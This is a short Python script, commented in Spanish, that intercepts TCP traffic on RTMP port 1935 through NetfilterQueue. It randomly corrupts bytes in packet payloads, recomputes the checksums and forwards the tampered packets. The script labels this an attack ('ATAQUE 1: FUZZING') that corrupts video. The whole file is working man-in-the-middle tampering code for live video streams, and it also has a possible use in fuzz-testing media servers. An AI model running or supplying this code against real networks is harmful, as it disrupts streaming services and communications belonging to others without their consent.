from scapy.all import *
from netfilterqueue import NetfilterQueue
import random

def procesar_paquete(packet):
    scapy_pkt = IP(packet.get_payload())
    
    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        if scapy_pkt[TCP].dport == 1935 or scapy_pkt[TCP].sport == 1935:
            payload = bytearray(scapy_pkt[Raw].load)
            
            # --- ATAQUE 1: FUZZING (Corrupción aleatoria de video) ---
            if len(payload) > 500:
                for _ in range(20):
                    posicion = random.randint(0, len(payload) - 1)
                    payload[posicion] = random.randint(0, 255)
                print(f"[!] FUZZING 1: Video corrupto! (Tamaño: {len(payload)} bytes)")
            
            scapy_pkt[Raw].load = bytes(payload)
            
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            packet.set_payload(bytes(scapy_pkt))
            
    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, procesar_paquete)

print("[*] Interceptor Klis activado: Fuzzing 1 (Payload)...")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[*] Apagando interceptor...")
nfqueue.unbind()
